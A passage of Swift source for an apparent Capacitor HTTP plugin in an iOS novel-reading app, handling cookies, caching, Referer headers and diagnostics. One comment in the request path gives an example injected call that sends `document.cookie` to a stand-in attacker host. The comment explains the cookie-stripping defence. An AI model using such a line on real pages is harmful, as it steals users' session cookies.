            let cookieHeader = SangTacHttpPlugin.mergeCookieHeader(jsHeader: nil,
                                                                   nativeCookies: cookies)
            if !cookieHeader.isEmpty { headers["Cookie"] = cookieHeader }
            // POST, not GET: it has to be the reader's own request (see above).
            // The empty body is what `app.net.post("/mobile/userinfo.php", "")`
            // sends, and `bodyHash` maps both it and `nil` to the same "-".
            self.warmRequest(method: "POST", url: url, headers: headers)
        }
    }

    /**
     One request issued by us rather than by the page, stored through the same
     class policy the page's own request will hit. The key has to match that
     request exactly -- same host, same method, same (empty) body, same
     translation variant -- or this is a wasted request rather than a warm cache.
     That is why the host comes from the page URL: it is what `fullUrl()` prefers
     while the origin is alive (app.v2.js:110-129).
     */
    private func warmRequest(method: String, url: URL, headers: [String: String]) {
        guard let cls = SangTacHttpPlugin.contentClass(method: method, url: url,
                                                       responseType: nil) else { return }
        let policy = ContentPolicies.policy(for: cls, config: contentCache.config)
        let key = ContentCache.key(cls: cls, method: method, url: url,
                                   variant: SangTacHttpPlugin.chapterVariant(headers["Cookie"]),
                                   bodyHash: ContentCache.bodyHash(nil),
                                   includeHost: SangTacHttpPlugin.includesHost(cls))
        if let existing = contentCache.entry(key),
           existing.expiresAt.map({ $0 > Date() }) ?? true {
            cacheLog("prewarm skipped: \(cls.rawValue) is already fresh")
            return
        }
        var request = URLRequest(url: url)
        request.httpMethod = method
        request.timeoutInterval = SangTacHttpPlugin.defaultTimeout
        for (name, value) in headers { request.setValue(value, forHTTPHeaderField: name) }
        session.dataTask(with: request) { [weak self] data, response, error in
            guard let self = self, error == nil, let http = response as? HTTPURLResponse,
                  http.statusCode >= 200, http.statusCode < 300 else { return }
            let body = data ?? Data()
            let contentType = (http.value(forHTTPHeaderField: "Content-Type") ?? "").lowercased()
            guard policy.accepts(body, contentType).isAccepted else { return }
            let headerMap = http.allHeaderFields.reduce(into: [String: String]()) { acc, pair in
                if let key = pair.key as? String { acc[key] = String(describing: pair.value) }
            }
            self.storeResponseCookies(http, for: url)
            self.contentCache.store(key: key, cls: cls, status: http.statusCode,
                                    contentType: contentType, headers: headerMap, body: body,
                                    ttl: policy.ttl, servedBy: url.host ?? "")
            self.cacheLog("\(method) \(url.absoluteString) prewarmed class="
                + "\(cls.rawValue) bytes=\(body.count)")
        }.resume()
    }

    @objc func get(_ call: CAPPluginCall) { perform("GET", call) }
    @objc func post(_ call: CAPPluginCall) { perform("POST", call) }
    @objc func put(_ call: CAPPluginCall) { perform("PUT", call) }
    @objc func patch(_ call: CAPPluginCall) { perform("PATCH", call) }
    @objc func delete(_ call: CAPPluginCall) { perform("DELETE", call) }

    @objc func request(_ call: CAPPluginCall) {
        let method = (call.getString("method") ?? "GET").uppercased()
        perform(method, call)
    }

    /// Kept for parity with the Android build's patched App plugin: cookies are
    /// already bridged on every request, so this is a no-op acknowledgement.
    @objc func syncCookies(_ call: CAPPluginCall) {
        nativeCookies(for: nil) { [weak self] cookies in
            self?.callLog("syncCookies", "bridged \(cookies.count) cookie(s)")
            call.resolve(["value": true, "count": cookies.count])
        }
    }

    /**
     The Android build's Http plugin carries the read-aloud foreground service.
     iOS keeps playing while the app is foregrounded and there is nothing to
     start, but app.v2.read.js calls these through
     `Capacitor.nativePromise("Http", ...)` without a catch, so an unregistered
     method would surface as an unhandled rejection in the diagnostic panel.
     */
    @objc func startForeground(_ call: CAPPluginCall) {
        call.resolve(["value": true])
    }

    @objc func stopForeground(_ call: CAPPluginCall) {
        call.resolve(["value": true])
    }

    // MARK: - Core request path

    private func perform(_ method: String, _ call: CAPPluginCall) {
        // Wall-clock cost of everything this plugin owns: cookie-store read,
        // request build, network round trip. The site's own book-list/reader
        // calls were reported as "very slow"; without this number there is no
        // way to tell a slow server from slow JS in the web view.
        let started = Date()
        func elapsedMs() -> Int { Int(Date().timeIntervalSince(started) * 1000) }

        guard var urlString = call.getString("url"), !urlString.isEmpty else {
            call.reject("Missing 'url'")
            return
        }

        if let params = call.getObject("params"), !params.isEmpty {
            urlString = SangTacHttpPlugin.appendingQuery(params, to: urlString)
        }
        guard let url = URL(string: urlString) else {
            // Redacted: the URL is what carries a `?key=`, and a reject message
            // reaches both the page and Capacitor's own os_log.
            call.reject("Invalid URL: \(SangTacHttpPlugin.redact(urlString))")
            return
        }

        var headers: [String: String] = [:]
        if let raw = call.getObject("headers") {
            for (key, value) in raw where !(value is NSNull) {
                headers[key] = String(describing: value)
            }
        }

        // A page script can pass any Cookie header it likes, and it can aim the
        // request anywhere. Cookies -- ours and the ones the caller supplied --
        // only travel to the site's own hosts, so an injected
        // `Http.get({url: 'https://evil.tld', headers: {Cookie: document.cookie}})`
        // arrives empty. The request itself still goes through, which is what
        // keeps a user-configured translation endpoint working.
        let cookieAllowed = SangTacHttpPlugin.allowsCookies(url)
        if !cookieAllowed {
            // Snapshot the names first: removing from a dictionary while
            // iterating its own `keys` view is undefined.
            let cookieNames = headers.keys.filter { $0.lowercased() == "cookie" }
            for key in cookieNames {
                headers.removeValue(forKey: key)
            }
            // Once per host, so a rotated mirror that silently loses its session
            // is visible instead of looking like a random "logged out".
            warnForeignHost(url)
        }

        let jsCookieHeader = cookieAllowed
            ? headers.first { $0.key.lowercased() == "cookie" }?.value
            : nil

        let timeout = SangTacHttpPlugin.timeoutSeconds(from: call)
        // Resolve the Referer fallback here, on the calling (main) thread, so we
        // never touch bridge.webView from a cookie-store callback queue.
        let refererFallback = pageReferer(for: url)

        nativeCookies(for: url, allowed: cookieAllowed) { [weak self] cookies in
            guard let self = self else { return }

            if !cookies.isEmpty {
                headers["Cookie"] = SangTacHttpPlugin.mergeCookieHeader(
                    jsHeader: jsCookieHeader, nativeCookies: cookies)
            }
            // Implicit browser headers the site relies on (the read endpoints
            // require a same-site Referer; URLSession does not add one).
            if headers["Referer"] == nil, headers["referer"] == nil, !refererFallback.isEmpty {
                headers["Referer"] = refererFallback
            }
            if headers["User-Agent"] == nil, headers["user-agent"] == nil {
                headers["User-Agent"] = SangTacHttpPlugin.defaultUserAgent
            }

            // Which class of answer this is, decided before the lookup so the key
            // and the store rule come from one place.
            let contentClass = SangTacHttpPlugin.contentClass(
                method: method, url: url, responseType: call.getString("responseType"))
            if contentClass == .userInfo { self.noteUserInfoRequest() }
            // Built before the lookup: for the POST lists the body is part of the
            // key, and building it may add a Content-Type header.
            let body = self.bodyData(for: call, headers: &headers)
            // `rescan=true` is the reader asking for a fresh copy of a chapter it
            // already has (app.v2.read.js:566-567). It must never be answered from
            // the cache, and its answer replaces whatever was stored.
            let bypassCache = url.absoluteString.contains("rescan=true")

            var cacheKey: String?
            var policy: ContentPolicy?
            if let contentClass = contentClass {
                // The key is built HERE, from the Cookie header that is *about to
                // be sent*, not from that header's two sources separately. They
                // can disagree -- the native snapshot lags the page's own
                // `document.cookie` writes, and for httpOnly names the page's
                // header has no value at all -- and a key derived from them
                // independently would describe a request that was never sent, then
                // serve a chapter in the language the reader had already moved
                // away from.
                cacheKey = ContentCache.key(
                    cls: contentClass, method: method, url: url,
                    variant: SangTacHttpPlugin.chapterVariant(headers["Cookie"]),
                    bodyHash: ContentCache.bodyHash(body),
                    includeHost: SangTacHttpPlugin.includesHost(contentClass))
                policy = ContentPolicies.policy(for: contentClass,
                                                config: self.contentCache.config)
            }

            // 1. An answer we already have on disk --------------------------
            var conditional: ContentCache.Entry?
            if let key = cacheKey, let policy = policy, !bypassCache {
                if let hit = self.contentCache.lookup(key) {
                    let fresh = hit.entry.expiresAt.map { $0 > Date() } ?? true
                    let age = Int(Date().timeIntervalSince(hit.entry.storedAt))
                    if fresh {
                        self.contentCache.noteHit()
                        self.cacheLog("\(method) \(url.absoluteString) cache hit class="
                            + "\(policy.cls.rawValue) age=\(age)s by=\(hit.entry.servedBy)")
                        self.deliver(status: hit.entry.status,
                                     contentType: hit.entry.contentType,
                                     headers: hit.entry.headers, body: hit.body,
                                     url: url, call: call, method: method,
                                     label: "cache", elapsedMs: elapsedMs())
                        return
                    }
                    if policy.serveStale {
                        // Shown now, refreshed behind the reader -- the whole point
                        // of a stale-while-revalidate window ("先显示，后台再取新
                        // 数据，有变化就更新").
                        self.contentCache.noteStaleServed()
                        self.cacheLog("\(method) \(url.absoluteString) cache stale class="
                            + "\(policy.cls.rawValue) age=\(age)s refresh=scheduled")
                        self.deliver(status: hit.entry.status,
                                     contentType: hit.entry.contentType,
                                     headers: hit.entry.headers, body: hit.body,
                                     url: url, call: call, method: method,
                                     label: "stale", elapsedMs: elapsedMs())
                        self.refreshBehind(key: key, policy: policy, url: url, method: method,
                                           headers: headers, body: body, stale: hit.entry,
                                           staleBody: hit.body)
                        return
                    }
                    if policy.revalidate {
                        // Expired and not worth showing: ask the server whether our
                        // copy is still current instead of re-downloading it.
                        conditional = hit.entry
                    }
                }
            }

            // 1b. A refusal we have already paid for -------------------------
            // Deliberately after the disk lookup: a stale answer is still the
            // reader's content, and the one thing that must not happen is a
            // remembered 403 hiding a chapter that is sitting on disk.
            if let key = cacheKey, let policy = policy, !bypassCache,
               let refused = self.refusal(for: key, cls: policy.cls) {
                let age = Int(Date().timeIntervalSince(refused.at))
                // Which layer answered matters: "remembered in this process" and
                // "remembered from a previous launch" are the two halves of the
                // claim, and a log that does not say which one is in force cannot
                // prove either.
                let why = refused.persisted
                    ? "remembered on disk, \(Int(ContentCache.refusalRetention))s window"
                    : "not retried within \(Int(SangTacHttpPlugin.refusalWindow))s"
                self.cacheLog("\(method) \(url.absoluteString) refused again class="
                    + "\(policy.cls.rawValue) age=\(age)s status=\(refused.status) (\(why))")
                self.deliver(status: refused.status, contentType: refused.contentType,
                             headers: refused.headers, body: refused.body, url: url,
                             call: call, method: method, label: "refused",
                             elapsedMs: elapsedMs())
                return
            }

            // 2. The network half, shared with any identical request already on
            //    the wire ----------------------------------------------------
            var request = URLRequest(url: url)
            request.httpMethod = method
            request.timeoutInterval = timeout
            if SangTacHttpPlugin.mustRevalidate(url) {
                request.cachePolicy = .reloadIgnoringLocalCacheData
            }
            if let conditional = conditional, let policy = policy, policy.revalidate {
                if let stamp = conditional.headers["Last-Modified"]
                    ?? conditional.headers["last-modified"] {
                    request.setValue(stamp, forHTTPHeaderField: "If-Modified-Since")
                }
                if let tag = conditional.headers["ETag"] ?? conditional.headers["etag"] {
                    request.setValue(tag, forHTTPHeaderField: "If-None-Match")
                }
            }
            for (key, value) in headers {
                request.setValue(value, forHTTPHeaderField: key)
            }
            if let body = body {
                request.httpBody = body
            }

            if let key = cacheKey {
                let elected = self.registerInFlight(key) { answer in
                    if let failure = answer.failure {
                        self.callLog("err", "\(method) \(url.absoluteString) shared request failed: "
                            + failure)
                        call.reject(failure)
                        return
                    }
                    self.cacheLog("\(method) \(url.absoluteString) shared in-flight answer "
                        + "(\(answer.body.count)b)")
                    self.deliver(status: answer.status, contentType: answer.contentType,
                                 headers: answer.headers, body: answer.body, url: url,
                                 call: call, method: method, label: "shared",
                                 elapsedMs: elapsedMs())
                }
                guard elected else { return }
            }

            self.session.dataTask(with: request) { data, response, error in
                if let error = error {
                    // The localized description can embed the URL, so it is
                    // redacted before it reaches the page or Capacitor's log.
                    let message = SangTacHttpPlugin.redact(error.localizedDescription)
                    self.callLog("err", "\(method) \(url.absoluteString) -> \(message)")
                    self.report("ERR", "\(method) \(url.absoluteString) FAILED in "
                        + "\(elapsedMs())ms: \(message)", force: true)
                    if let key = cacheKey {
                        self.finishInFlight(key, answer: SangTacHttpPlugin.failedAnswer(message))
                    }
                    call.reject(message, nil, error)
                    return
                }
                guard let http = response as? HTTPURLResponse else {
                    self.report("ERR", "\(method) \(url.absoluteString) no HTTP response",
                                force: true)
                    if let key = cacheKey {
                        self.finishInFlight(
                            key, answer: SangTacHttpPlugin.failedAnswer("No HTTP response"))
                    }
                    call.reject("No HTTP response")
                    return
                }

                self.storeResponseCookies(http, for: url)

                let body = data ?? Data()
                let contentType = (http.value(forHTTPHeaderField: "Content-Type") ?? "").lowercased()
                let headerMap = http.allHeaderFields.reduce(into: [String: String]()) { acc, pair in
                    if let key = pair.key as? String { acc[key] = String(describing: pair.value) }
                }

                // 304: the copy we already had is still current. Restart its clock
                // and hand back the stored bytes -- this is the cheapest possible
                // refresh of the 115KB chapter list.
                if http.statusCode == 304, let key = cacheKey, let policy = policy,
                   let stored = self.contentCache.lookup(key) {
                    self.contentCache.renew(key, ttl: policy.ttl)
                    self.contentCache.noteRevalidation(used304: true)
                    self.cacheLog("\(method) \(url.absoluteString) 304 reused class="
                        + "\(policy.cls.rawValue)")
                    self.finishInFlight(key, answer: SharedAnswer(
                        status: stored.entry.status,
                        contentType: stored.entry.contentType,
                        headers: stored.entry.headers, body: stored.body, failure: nil))
                    self.deliver(status: stored.entry.status,
                                 contentType: stored.entry.contentType,
                                 headers: stored.entry.headers, body: stored.body,
                                 url: url, call: call, method: method, label: "304",
                                 elapsedMs: elapsedMs())
                    return
                }

                // Keep the answer for the next launch. The class's own `accepts`
                // is what decides, and a refusal is logged with its reason so that
                // a "nothing is being cached" report has an answer in the log.
                if let key = cacheKey, let policy = policy, !bypassCache {
                    if http.statusCode >= 200, http.statusCode < 300 {
                        switch policy.accepts(body, contentType) {
                        case .accept:
                            self.contentCache.store(key: key, cls: policy.cls, status: http.statusCode,
                                                    contentType: contentType, headers: headerMap,
                                                    body: body, ttl: policy.ttl,
                                                    servedBy: url.host ?? "")
                            self.cacheLog("\(method) \(url.absoluteString) cached class="
                                + "\(policy.cls.rawValue) ttl=\(Int(policy.ttl))s bytes=\(body.count)"
                                + self.cacheTotalsOnce())
                        case .reject(let why):
                            self.contentCache.noteReject()
                            // The one class that is neither stored nor free to
                            // re-fetch: record whether this answer is the same
                            // as the last one, so the next log can decide whether
                            // it ever may be reused (see `noteGrantDigest`).
                            let evidence = policy.cls == .grant
                                ? self.noteGrantDigest(key: key, body: body) : ""
                            self.cacheLog("\(method) \(url.absoluteString) not cached class="
                                + "\(policy.cls.rawValue) status=\(http.statusCode) "
                                + "bytes=\(body.count) content-type="
                                + "\(contentType.isEmpty ? "none" : contentType)"
                                + " (\(why)) head=" + SangTacHttpPlugin.head(body)
                                + evidence)
                        }
                    } else if http.statusCode >= 400 {
                        // An error status used to leave no trace at all: this
                        // whole block only ran for 2xx, so the one class whose
                        // visible behaviour *is* a refusal -- an image slot on a
                        // mirror that blocks hotlinks -- never appeared in the log
                        // even once. It also went back to the network every time;
                        // now it is remembered for a minute, and for an image it
                        // is written down so the next launch is spared the same
                        // 853ms (round-49 log: 09:53:04 and 09:53:46 in two
                        // different processes, `in 853ms` twice).
                        self.contentCache.noteReject()
                        let written = self.notePersistedRefusal(
                            key: key, cls: policy.cls, status: http.statusCode,
                            contentType: contentType, headers: headerMap, body: body)
                        self.cacheLog("\(method) \(url.absoluteString) not cached class="
                            + "\(policy.cls.rawValue) status=\(http.statusCode) "
                            + "bytes=\(body.count) content-type="
                            + "\(contentType.isEmpty ? "none" : contentType)"
                            + " (HTTP error answer) head=" + SangTacHttpPlugin.head(body)
                            + (written ? " | refusal written to disk, "
                                + "\(Int(ContentCache.refusalRetention))s window" : ""))
                        self.noteRefusal(key: key, status: http.statusCode,
                                         contentType: contentType, headers: headerMap,
                                         body: body)
                    }
                }

                if let key = cacheKey {
                    self.finishInFlight(key, answer: SharedAnswer(
                        status: http.statusCode, contentType: contentType,
                        headers: headerMap, body: body,
                        failure: http.statusCode >= 400 ? "HTTP \(http.statusCode)" : nil))
                }
                self.deliver(status: http.statusCode, contentType: contentType,
                             headers: headerMap, body: body, url: url,
                             resultURL: http.url?.absoluteString, call: call,
                             method: method, label: "", elapsedMs: elapsedMs())
            }.resume()
        }
    }

    // MARK: - Response payload (Android parity)

    private struct Payload {
        let value: Any
        let kind: String
    }

    /**
     Mirrors com.getcapacitor.plugin.util.HttpRequestHandler.readData:
       - Content-Type contains "application/json" -> parsed JSON
       - otherwise responseType blob/arraybuffer    -> base64 string
       - otherwise responseType json                -> parsed JSON
       - otherwise                                  -> raw string
     The site's app.reader.getContent2 calls `r.data.replace(...)` on a
     text/html response, so this branch is load-bearing for chapter reading.
     */
    private static func responsePayload(body: Data, contentType: String, responseType: String?) -> Payload {
        let isJSONMime = contentType.contains("application/json")
            || contentType.contains("application/vnd.api+json")
        let requested = (responseType ?? "text").lowercased()

        if isJSONMime || requested == "json" {
            if let parsed = parseJSON(body) { return Payload(value: parsed, kind: "json") }
            return Payload(value: String(data: body, encoding: .utf8) ?? "",
                           kind: "string(unparsed-json)")
        }

        if requested == "arraybuffer" || requested == "blob" {
            // Binary: covers, page-flip.mp3, TTS WAV. Decoding this as UTF-8
            // produced a string that was immediately discarded -- on every
            // image the book list loaded.
            return Payload(value: body.base64EncodedString(), kind: "base64")
        }

        return Payload(value: String(data: body, encoding: .utf8) ?? "", kind: "string")
    }

    private static func parseJSON(_ data: Data) -> Any? {
        if data.isEmpty { return "" }
        return try? JSONSerialization.jsonObject(with: data, options: [.fragmentsAllowed])
    }

    // MARK: - Timeout

    /// The site passes `timeout` (ms) on its /warp.php probes; the Capacitor
    /// plugin API also has connectTimeout / readTimeout. Accept all three.
    /// Read the raw option rather than relying on a typed accessor so a
    /// non-numeric value can never trap.
    private static func timeoutSeconds(from call: CAPPluginCall) -> TimeInterval {
        for key in ["timeout", "readTimeout", "connectTimeout"] {
            guard let raw = call.options[key], !(raw is NSNull) else { continue }
            let ms: Double?
            if let number = raw as? NSNumber {
                ms = number.doubleValue
            } else if let text = raw as? String {
                ms = Double(text)
            } else {
                ms = nil
            }
            if let ms = ms, ms > 0 {
                return max(ms / 1000.0, 1.0)
            }
        }
        return defaultTimeout
    }

    // MARK: - Body

    private func bodyData(for call: CAPPluginCall, headers: inout [String: String]) -> Data? {
        // Read the raw bridged value rather than JSValue so both string and
        // JSON-object bodies are handled uniformly.
        guard let data = call.options["data"], !(data is NSNull) else { return nil }

        if let text = data as? String {
            if headers["Content-Type"] == nil, headers["content-type"] == nil {
                headers["Content-Type"] = "application/x-www-form-urlencoded; charset=utf-8"
            }
            return text.data(using: .utf8)
        }

        if JSONSerialization.isValidJSONObject(data),
           let json = try? JSONSerialization.data(withJSONObject: data) {
            if headers["Content-Type"] == nil, headers["content-type"] == nil {
                headers["Content-Type"] = "application/json; charset=utf-8"
            }
            return json
        }

        return nil
    }

    // MARK: - Referer

    /// Browsers send the current document URL as Referer. The site's read
    /// endpoints validate it, so prefer the web view's URL over a bare origin.
    /// Must be called on the main thread.
    private func pageReferer(for url: URL) -> String {
        if let page = self.bridge?.webView?.url?.absoluteString, !page.isEmpty {
            return page
        }
        if let scheme = url.scheme, let host = url.host {
            return "\(scheme)://\(host)/"
        }
        return ""
    }

    // MARK: - Diagnostics

    /// Lines waiting for the next runloop turn. One `evaluateJavaScript` per
    /// runloop turn instead of one per request: on a list page that is dozens of
    /// cross-process hops collapsed into a handful. `pendingForced` records
    /// whether any of them must survive the panel being switched off.
    private var pendingLines: [String] = []
    private var pendingForced = false

    /// Push one line into the in-page diagnostic panel installed by
    /// SangTacAppPlugin (window.__stvDiag). Silent when the panel is absent.
    ///
    /// `force` is for failures: a 4xx/5xx or a transport error is sent even with
    /// the panel switched off, and the JS side keeps those lines in its buffer
    /// without rendering them, so "why did that fail?" is still there if the
    /// reader turns logging on afterwards.
    private func report(_ tag: String, _ message: String, force: Bool = false) {
        guard force || diagnosticsOn else { return }
        let line = "[\(tag)] " + SangTacHttpPlugin.redact(message)
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            self.pendingLines.append(line)
            self.pendingForced = self.pendingForced || force
            // Only the first line of a turn schedules the flush; the rest ride
            // along in the same batch.
            guard self.pendingLines.count == 1 else { return }
            DispatchQueue.main.async { [weak self] in
                guard let self = self else { return }
                let batch = self.pendingLines
                let forced = self.pendingForced
                self.pendingLines = []
                self.pendingForced = false
                guard !batch.isEmpty else { return }
                let js = "window.__stvDiag && window.__stvDiag.logBatch("
                    + SangTacHttpPlugin.jsArrayLiteral(batch)
                    + (forced ? ",true" : "") + ");"
                self.bridge?.webView?.evaluateJavaScript(js, completionHandler: nil)
            }
        }
    }

    /// A JSON array of strings is a valid JavaScript array literal, so the batch
    /// needs no hand-rolled escaping.
    private static func jsArrayLiteral(_ values: [String]) -> String {
        guard let data = try? JSONSerialization.data(withJSONObject: values),
              let text = String(data: data, encoding: .utf8) else {
            return "[]"
        }
        return text
    }

    /// One line of the response body, so a server-side error message is readable
    /// in the on-device panel instead of just "status 500".
    ///
    /// Bounded on purpose: chapter HTML is routinely 100KB+ and the panel keeps
    /// 240 characters, so decoding the whole body to then throw 99.8% of it away
    /// was pure waste -- and this used to run on every single request.
    ///
    /// `String(decoding:as:)` rather than `String(data:encoding:)`: a byte slice
    /// cuts UTF-8 characters in half on exactly the long CJK/Vietnamese bodies
    /// this exists for, and the failable initialiser answers `nil` -- an empty
    /// preview -- for the whole line.
    private static func preview(payload: Payload, body: Data) -> String {
        let source: String
        if let string = payload.value as? String {
            source = String(string.prefix(4096))
        } else {
            source = String(decoding: body.prefix(4096), as: UTF8.self)
        }
        let collapsed = source
            .split(whereSeparator: { $0.isNewline || $0 == "\t" })
            .joined(separator: " ")
        if collapsed.count <= 240 { return collapsed }
        return String(collapsed.prefix(240)) + "..."
    }

    // MARK: - Cookies

    /// Reads the snapshot when it is warm; otherwise falls back to the
    /// asynchronous store read and seeds the snapshot from its answer.
    private func nativeCookies(for url: URL?,
                               allowed: Bool = true,
                               _ completion: @escaping ([HTTPCookie]) -> Void) {
        guard allowed else {
            completion([])
            return
        }
        if let cached = snapshotCookies(for: url) {
            completion(cached)
            return
        }
        let generation = currentGeneration()
        DispatchQueue.main.async {
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { [weak self] cookies in
                self?.setSnapshot(cookies, issuedAt: generation)
                guard let url = url else {
                    completion(cookies)
                    return
                }
                completion(SangTacHttpPlugin.matching(cookies, host: url.host ?? ""))
            }
        }
    }

    private static func matching(_ cookies: [HTTPCookie], host: String) -> [HTTPCookie] {
        guard !host.isEmpty else { return cookies }
        return cookies.filter { cookie in
            let domain = cookie.domain.hasPrefix(".") ? String(cookie.domain.dropFirst()) : cookie.domain
            return host == domain || host.hasSuffix("." + domain)
        }
    }

    /**
     What makes two chapter answers the same answer, derived from the Cookie
     header the request actually carries.

     The translation-mode cookies (`transmode`, `foreignlang`) are written by the
     site immediately before every chapter read (`app.v2.read.js:965
     setTransMode`) and decide the language of the body, so they belong in the
     identity of the response. Taking them from the sent header -- rather than
     from the page's header or the native snapshot separately -- is what keeps the
     key honest, because those two sources can disagree and only the merged header
     is what the server will see.

     The session cookies deliberately do not contribute their values.
     `readcontextid` and friends are reissued by the server as reads progress, so
     keying on them would make the cache miss every time and buy nothing. Whether
     a session was present at all is kept, so signing out can never be served out
     of a signed-in cache.
     */
    private static func chapterVariant(_ sentCookieHeader: String?) -> String {
        var mode: [String: String] = [:]
        var signedIn = false
        for pair in (sentCookieHeader ?? "").split(separator: ";") {
            let trimmed = pair.trimmingCharacters(in: .whitespaces)
            let parts = trimmed.split(separator: "=", maxSplits: 1)
            guard let name = parts.first.map(String.init), !name.isEmpty else { continue }
            let value = parts.count > 1 ? String(parts[1]) : ""
            if name == "transmode" || name == "foreignlang" {
                mode[name] = value
            } else if name == "access" || name == "useri2" {
                signedIn = true
            }
        }
        // Fixed name order, so the key is deterministic without sorting.
        var ordered: [String] = []
        for name in ["transmode", "foreignlang"] {
            if let value = mode[name] { ordered.append(name + "=" + value) }
        }
        return ordered.joined(separator: ";") + "|" + (signedIn ? "in" : "out")
    }

    /**
     Hand one answer back to one caller: build the payload through the same
     `responsePayload` branch the network path uses (its typing is load-bearing --
     the reader calls `r.data.replace(...)` on a text/html body, so an answer that
     came off the disk has to go through the identical branch), log it, and
     resolve.

     `label` says where the bytes came from -- `cache`, `stale`, `304`, `shared`,
     or empty for a fresh network answer. That word is how the next device log
     answers "is the cache doing anything at all", which is exactly what the
     2026-10-12 report could not tell: the panel is the only place a sideloaded
     build can show it, and `report` is gated on the diagnostics switch, so this
     costs nothing while logging is off.
     */
    private func deliver(status: Int, contentType: String, headers: [String: String],
                         body: Data, url: URL, resultURL: String? = nil,
                         call: CAPPluginCall, method: String, label: String,
                         elapsedMs: Int) {
        let payload = SangTacHttpPlugin.responsePayload(
            body: body, contentType: contentType,
            responseType: call.getString("responseType"))
        var result: [String: Any] = [
            "status": status,
            "headers": headers,
            "url": resultURL ?? url.absoluteString,
            "data": payload.value
        ]
        let isFailure = status >= 400 || status == 0
        if isFailure { result["error"] = true }
        let suffix = label.isEmpty ? "" : " (\(label))"
        callLog(isFailure ? "err" : "ok", "\(method) \(url.absoluteString) -> \(status) "
            + "bytes=\(body.count) data=\(payload.kind)\(suffix)")
        // Only failures reach the panel while logging is off: the preview decodes
        // the response body and every report is a cross-process call, and paying
        // that for a 200 on every request in a list page is exactly the waste this
        // gate exists to remove. The check sits outside the string build so
        // `preview()` is never even called.
        //
        // A 4xx counts as a failure too: an expired session answers 401/403 and
        // "the request failed" is exactly what a bug report needs.
        if isFailure || diagnosticsOn {
            report(isFailure ? "ERR" : "Http",
                   "\(method) \(url.absoluteString) -> \(status) "
                + "\(contentType.isEmpty ? "no-content-type" : contentType) "
                + "\(payload.kind) \(body.count)b in \(elapsedMs)ms\(suffix) "
                + SangTacHttpPlugin.preview(payload: payload, body: body),
                   force: isFailure)
        }
        call.resolve(result)
    }

    /// The answer handed to a caller whose shared request failed.
    static func failedAnswer(_ message: String) -> SharedAnswer {
        SharedAnswer(status: 0, contentType: "", headers: [:], body: Data(), failure: message)
    }

    /**
     The background half of stale-while-revalidate: the reader already has the old
     answer on screen, so this exists to make the *next* request fresh -- and, when
     the bytes really changed, to tell the page so it can re-render whatever part
     of the screen is showing them (`contentRefreshed`, consumed by the
     `contentCache` block in SitePatch.swift).

     Failures are silent by design: nobody is waiting on this one.
     */
    private func refreshBehind(key: String, policy: ContentPolicy, url: URL,
                               method: String, headers: [String: String], body: Data?,
                               stale: ContentCache.Entry, staleBody: Data) {
        var request = URLRequest(url: url)
        request.httpMethod = method
        request.timeoutInterval = SangTacHttpPlugin.defaultTimeout
        request.cachePolicy = .reloadIgnoringLocalCacheData
        if policy.revalidate {
            if let stamp = stale.headers["Last-Modified"] ?? stale.headers["last-modified"] {
                request.setValue(stamp, forHTTPHeaderField: "If-Modified-Since")
            }
            if let tag = stale.headers["ETag"] ?? stale.headers["etag"] {
                request.setValue(tag, forHTTPHeaderField: "If-None-Match")
            }
        }
        for (name, value) in headers { request.setValue(value, forHTTPHeaderField: name) }
        if let body = body { request.httpBody = body }
        session.dataTask(with: request) { [weak self] data, response, _ in
            guard let self = self, let http = response as? HTTPURLResponse else { return }
            let contentType = (http.value(forHTTPHeaderField: "Content-Type") ?? "").lowercased()
            if http.statusCode == 304 {
                self.contentCache.renew(key, ttl: policy.ttl)
                self.contentCache.noteRevalidation(used304: true)
                self.cacheLog("\(method) \(url.absoluteString) background refresh 304 class="
                    + "\(policy.cls.rawValue)")
                return
            }
            guard http.statusCode >= 200, http.statusCode < 300 else { return }
            let fresh = data ?? Data()
            guard policy.accepts(fresh, contentType).isAccepted else { return }
            let headerMap = http.allHeaderFields.reduce(into: [String: String]()) { acc, pair in
                if let key = pair.key as? String { acc[key] = String(describing: pair.value) }
            }
            let changed = ContentCache.bodyHash(fresh) != ContentCache.bodyHash(staleBody)
            self.contentCache.store(key: key, cls: policy.cls, status: http.statusCode,
                                    contentType: contentType, headers: headerMap, body: fresh,
                                    ttl: policy.ttl, servedBy: url.host ?? "")
            self.contentCache.noteRevalidation(used304: false)
            self.cacheLog("\(method) \(url.absoluteString) background refresh class="
                + "\(policy.cls.rawValue) changed=\(changed ? "yes" : "no")")
            guard changed else { return }
            // Only the page can re-render what it already drew, and only the page
            // knows whether that screen is still on top -- so the event carries the
            // url and the class, and the injected block decides what to do.
            DispatchQueue.main.async {
                self.notifyListeners("contentRefreshed", data: [
                    "url": url.absoluteString,
                    "class": policy.cls.rawValue,
                    "bytes": fresh.count
                ])
            }
        }.resume()
    }

    private func storeResponseCookies(_ response: HTTPURLResponse, for url: URL) {
        let headerFields = response.allHeaderFields.reduce(into: [String: String]()) { acc, pair in
            if let key = pair.key as? String { acc[key] = String(describing: pair.value) }
        }
        let cookies = HTTPCookie.cookies(withResponseHeaderFields: headerFields, for: url)
        guard !cookies.isEmpty else { return }
        // Update the snapshot synchronously: the observer is asynchronous, and a
        // login round trip must not have its very next request miss the session
        // cookie it just received.
        mergeSnapshot(cookies)
        DispatchQueue.main.async {
            let store = WKWebsiteDataStore.default().httpCookieStore
            for cookie in cookies {
                store.setCookie(cookie, completionHandler: nil)
                HTTPCookieStorage.shared.setCookie(cookie)
            }
        }
    }

    private static func mergeCookieHeader(jsHeader: String?, nativeCookies: [HTTPCookie]) -> String {
        var ordered: [String] = []
        var seen = Set<String>()
        for cookie in nativeCookies {
            if seen.insert(cookie.name).inserted {
                ordered.append("\(cookie.name)=\(cookie.value)")
            }
        }
        if let jsHeader = jsHeader {
            for pair in jsHeader.split(separator: ";") {
                let trimmed = pair.trimmingCharacters(in: .whitespaces)
                guard let name = trimmed.split(separator: "=").first.map(String.init), !name.isEmpty else { continue }
                if seen.insert(name).inserted {
                    ordered.append(trimmed)
                }
            }
        }
        return ordered.joined(separator: "; ")
    }

    private static func appendingQuery(_ params: [String: Any], to urlString: String) -> String {
        guard var components = URLComponents(string: urlString) else { return urlString }
        var items = components.queryItems ?? []
        for (key, value) in params where !(value is NSNull) {
            items.append(URLQueryItem(name: key, value: String(describing: value)))
        }
        components.queryItems = items
        return components.url?.absoluteString ?? urlString
    }

    private func callLog(_ tag: String, _ message: String) {
